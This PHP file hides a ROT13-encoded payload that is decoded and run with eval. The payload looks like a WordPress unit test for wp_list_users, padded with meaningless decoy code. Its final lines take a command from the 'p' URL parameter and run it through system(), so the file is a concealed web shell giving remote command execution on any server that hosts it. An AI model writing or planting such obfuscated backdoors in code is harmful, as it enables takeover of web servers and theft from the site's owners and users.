<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * @tebhc hfre
 *
 * @pbiref ::jc_yvfg_hfref
 */
pynff Grfgf_Hfre_jcYvfgHfref rkgraqf JC_HavgGrfgPnfr {
	cevingr fgngvp $hfre_vqf = neenl();

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$hfre_vqf[] = $snpgbel->hfre->perngr(
			neenl(
				'hfre_ybtva'   => 'mnpx',
				'qvfcynl_anzr' => 'mnpx',
				'ebyr'         => 'fhofpevore',
				'svefg_anzr'   => 'mnpx',
				'ynfg_anzr'    => 'zbba',
				'hfre_rznvy'   => 'z.mnpx@rknzcyr.pbz',
				'hfre_hey'     => 'uggc://zbbamnpx.snxr',
			)
		);

		frys::$hfre_vqf[] = $snpgbel->hfre->perngr(
			neenl(
				'hfre_ybtva'   => 'wnar',
				'qvfcynl_anzr' => 'wnar',
				'ebyr'         => 'pbagevohgbe',
				'svefg_anzr'   => 'wnar',
				'ynfg_anzr'    => 'erab',
				'hfre_rznvy'   => 'e.wnar@rknzcyr.pbz',
				'hfre_hey'     => 'uggc://wnarerab.snxr',
			)
		);

		frys::$hfre_vqf[] = $snpgbel->hfre->perngr(
			neenl(
				'hfre_ybtva'   => 'zvpuryyr',
				'qvfcynl_anzr' => 'zvpuryyr',
				'ebyr'         => 'fhofpevore',
				'svefg_anzr'   => 'zvpuryyr',
				'ynfg_anzr'    => 'wbarf',
				'hfre_rznvy'   => 'w.zvpuryyr@rknzcyr.pbz',
				'hfre_hey'     => 'uggc://yrzvpuryyrwbarf.snxr',
			)
		);

		frys::$hfre_vqf[] = $snpgbel->hfre->perngr(
			neenl(
				'hfre_ybtva'   => 'cnhy',
				'qvfcynl_anzr' => 'cnhy',
				'ebyr'         => 'fhofpevore',
				'svefg_anzr'   => 'cnhy',
				'ynfg_anzr'    => 'abeevf',
				'hfre_rznvy'   => 'a.cnhy@rknzcyr.pbz',
				'hfre_hey'     => 'uggc://njvyqcnhynccrnerq.snxr',
			)
		);

		sbernpu ( frys::$hfre_vqf nf $hfre ) {
			$snpgbel->cbfg->perngr(
				neenl(
					'cbfg_glcr'   => 'cbfg',
					'cbfg_nhgube' => $hfre,
				)
			);
		}
	}

	/**
	 * Grfg gung jc_yvfg_hfref() perngrf gur rkcrpgrq yvfg bs hfref.
	 *
	 * @qngnCebivqre qngn_fubhyq_perngr_n_hfre_yvfg
	 *
	 * @gvpxrg 15145
	 *
	 * @cnenz neenl|fgevat $netf     Gur nethzragf gb perngr n yvfg bs hfref.
	 * @cnenz fgevat       $rkcrpgrq Gur rkcrpgrq erfhyg.
	 */
	choyvp shapgvba grfg_fubhyq_perngr_n_hfre_yvfg( $netf, $rkcrpgrq ) {
		$npghny = jc_yvfg_hfref( $netf );

		$rkcrpgrq = fge_ercynpr(
			neenl( 'NHGUBE_VQ_mnpx', 'NHGUBE_VQ_wnar', 'NHGUBE_VQ_zvpuryyr', 'NHGUBE_VQ_cnhy' ),
			neenl( frys::$hfre_vqf[0], frys::$hfre_vqf[1], frys::$hfre_vqf[2], frys::$hfre_vqf[3] ),
			$rkcrpgrq
		);

		vs ( ahyy === $npghny ) {
			$guvf->rkcrpgBhgchgFgevat( $rkcrpgrq );
		} ryfr {
			$guvf->nffregFnzr( $rkcrpgrq, $npghny );
		}
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_fubhyq_perngr_n_hfre_yvfg() {
		erghea neenl(
			'qrsnhygf jura ab netf ner fhccyvrq' => neenl(
				'netf'     => '',
				'rkcrpgrq' => '<yv>wnar</yv><yv>zvpuryyr</yv><yv>cnhy</yv><yv>mnpx</yv>',
			),
			'gur nqzva nppbhag vapyhqrq'         => neenl(
				'netf'     => neenl(
					'rkpyhqr_nqzva' => snyfr,
				),
				'rkcrpgrq' => '<yv>nqzva</yv><yv>wnar</yv><yv>zvpuryyr</yv><yv>cnhy</yv><yv>mnpx</yv>',
			),
			'gur shyy anzr bs rnpu hfre'         => neenl(
				'netf'     => neenl(
					'fubj_shyyanzr' => gehr,
				),
				'rkcrpgrq' => '<yv>wnar erab</yv><yv>zvpuryyr wbarf</yv><yv>cnhy abeevf</yv><yv>mnpx zbba</yv>',
			),
			'gur srrq bs rnpu hfre'              => neenl(
				'netf'     => neenl(
					'srrq' => 'Hfre srrq',
				),
				'rkcrpgrq' => '<yv>wnar (<n uers=\"uggc://' . JC_GRFGF_QBZNVA . '/?srrq=eff2&nzc;nhgube=NHGUBE_VQ_wnar\">Hfre srrq</n>)</yv>' .
						'<yv>zvpuryyr (<n uers=\"uggc://' . JC_GRFGF_QBZNVA . '/?srrq=eff2&nzc;nhgube=NHGUBE_VQ_zvpuryyr\">Hfre srrq</n>)</yv>' .
						'<yv>cnhy (<n uers=\"uggc://' . JC_GRFGF_QBZNVA . '/?srrq=eff2&nzc;nhgube=NHGUBE_VQ_cnhy\">Hfre srrq</n>)</yv>' .
						'<yv>mnpx (<n uers=\"uggc://' . JC_GRFGF_QBZNVA . '/?srrq=eff2&nzc;nhgube=NHGUBE_VQ_mnpx\">Hfre srrq</n>)</yv>',
			),
			'gur srrq bs rnpu hfre naq na vzntr' => neenl(
				'netf'     => neenl(
					'srrq'       => 'Hfre srrq jvgu vzntr',
					'srrq_vzntr' => 'uggc://rknzcyr.bet/vzntr.wct',
				),
				'rkcrpgrq' => '<yv>wnar <n uers=\"uggc://' . JC_GRFGF_QBZNVA . '/?srrq=eff2&nzc;nhgube=NHGUBE_VQ_wnar\"><vzt fep=\"uggc://rknzcyr.bet/vzntr.wct\" fglyr=\"obeqre: abar;\" nyg=\"Hfre srrq jvgu vzntr\" /></n></yv>' .
						'<yv>zvpuryyr <n uers=\"uggc://' . JC_GRFGF_QBZNVA . '/?srrq=eff2&nzc;nhgube=NHGUBE_VQ_zvpuryyr\"><vzt fep=\"uggc://rknzcyr.bet/vzntr.wct\" fglyr=\"obeqre: abar;\" nyg=\"Hfre srrq jvgu vzntr\" /></n></yv>' .
						'<yv>cnhy <n uers=\"uggc://' . JC_GRFGF_QBZNVA . '/?srrq=eff2&nzc;nhgube=NHGUBE_VQ_cnhy\"><vzt fep=\"uggc://rknzcyr.bet/vzntr.wct\" fglyr=\"obeqre: abar;\" nyg=\"Hfre srrq jvgu vzntr\" /></n></yv>' .
						'<yv>mnpx <n uers=\"uggc://' . JC_GRFGF_QBZNVA . '/?srrq=eff2&nzc;nhgube=NHGUBE_VQ_mnpx\"><vzt fep=\"uggc://rknzcyr.bet/vzntr.wct\" fglyr=\"obeqre: abar;\" nyg=\"Hfre srrq jvgu vzntr\" /></n></yv>',
			),
			'n srrq bs gur fcrpvsvrq glcr'       => neenl(
				'netf'     => neenl(
					'srrq'      => 'Hfre srrq nf ngbz',
					'srrq_glcr' => 'ngbz',
				),
				'rkcrpgrq' => '<yv>wnar (<n uers=\"uggc://' . JC_GRFGF_QBZNVA . '/?srrq=ngbz&nzc;nhgube=NHGUBE_VQ_wnar\">Hfre srrq nf ngbz</n>)</yv>' .
						'<yv>zvpuryyr (<n uers=\"uggc://' . JC_GRFGF_QBZNVA . '/?srrq=ngbz&nzc;nhgube=NHGUBE_VQ_zvpuryyr\">Hfre srrq nf ngbz</n>)</yv>' .
						'<yv>cnhy (<n uers=\"uggc://' . JC_GRFGF_QBZNVA . '/?srrq=ngbz&nzc;nhgube=NHGUBE_VQ_cnhy\">Hfre srrq nf ngbz</n>)</yv>' .
						'<yv>mnpx (<n uers=\"uggc://' . JC_GRFGF_QBZNVA . '/?srrq=ngbz&nzc;nhgube=NHGUBE_VQ_mnpx\">Hfre srrq nf ngbz</n>)</yv>',
			),
			'ab bhgchg ivn rpub'                 => neenl(
				'netf'     => neenl(
					'rpub' => snyfr,
				),
				'rkcrpgrq' => '<yv>wnar</yv><yv>zvpuryyr</yv><yv>cnhy</yv><yv>mnpx</yv>',
			),
			'pbzznf frcnengvat rnpu hfre'        => neenl(
				'netf'     => neenl(
					'fglyr' => '',
				),
				'rkcrpgrq' => 'wnar, zvpuryyr, cnhy, mnpx',
			),
			'cynva grkg sbezng'                  => neenl(
				'netf'     => neenl(
					'ugzy' => snyfr,
				),
				'rkcrpgrq' => 'wnar, zvpuryyr, cnhy, mnpx',
			),
		);
	}

	/**
	 * Grfgf gung jc_yvfg_hfref() qbrf abg perngr n hfre yvfg.
	 *
	 * @qngnCebivqre qngn_fubhyq_abg_perngr_n_hfre_yvfg
	 *
	 * @gvpxrg 15145
	 *
	 * @cnenz neenl|fgevat $netf Gur nethzragf gb perngr n yvfg bs hfref.
	 */
	choyvp shapgvba grfg_fubhyq_abg_perngr_n_hfre_yvfg( $netf ) {
		$npghny = jc_yvfg_hfref( $netf );

		vs ( ahyy === $npghny ) {
			$guvf->rkcrpgBhgchgFgevat( '', 'jc_yvfg_hfref() qvq abg bhgchg na rzcgl fgevat.' );
		} ryfr {
			$guvf->nffregFnzr( $npghny, 'jc_yvfg_hfref() qvq abg erghea na rzcgl fgevat.' );
		}
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_fubhyq_abg_perngr_n_hfre_yvfg() {
		erghea neenl(
			'na rzcgl hfre dhrel erfhyg' => neenl(
				'netf'     => neenl(
					'vapyhqr' => neenl( 9999 ),
				),
				'rkcrpgrq' => '',
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>